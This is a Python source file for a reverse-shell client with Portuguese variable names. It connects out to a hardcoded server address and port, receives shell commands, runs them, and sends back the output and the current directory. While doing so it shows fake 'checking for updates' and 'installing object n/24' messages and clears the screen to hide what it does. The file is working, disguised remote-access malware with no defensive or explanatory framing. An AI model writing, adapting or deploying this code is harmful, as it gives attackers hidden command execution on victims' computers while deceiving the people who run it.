import socket
from os import getcwd, chdir, system, name
from subprocess import getoutput as get

vermelho = '\033[0;31m'
verde = '\033[0;32m'
amarelo = '\033[0;33m'
fim = '\033[m'

ip_servidor = '192.168.100.28'
porta_servidor = 4455
separador = '<->'
c = 0

s = socket.socket()

s.connect((ip_servidor, porta_servidor))

cwd = getcwd()
print(f'{amarelo}[i] Verificando atualizações...{fim}')
s.send(cwd.encode())

while True:
    comando_shell = s.recv(1024).decode()
    if comando_shell.lower() == 'sair':
        s.close()
    if comando_shell.split()[0] == 'cd':
        try:
            chdir(''.join(comando_shell.split()[1]))
        except FileNotFoundError as e:
            result = e
        else:
            result = ''
    else:
        result = get(comando_shell)
    cwd = getcwd()
    mensagem = f'{result}{separador}{cwd}'
    s.send(mensagem.encode())
    if name == 'nt':
        system('cls')
    else:
        system('clear')
    print(f'{amarelo}[i] Instalando objeto {c + 1}/24...{fim}')
    c += 1
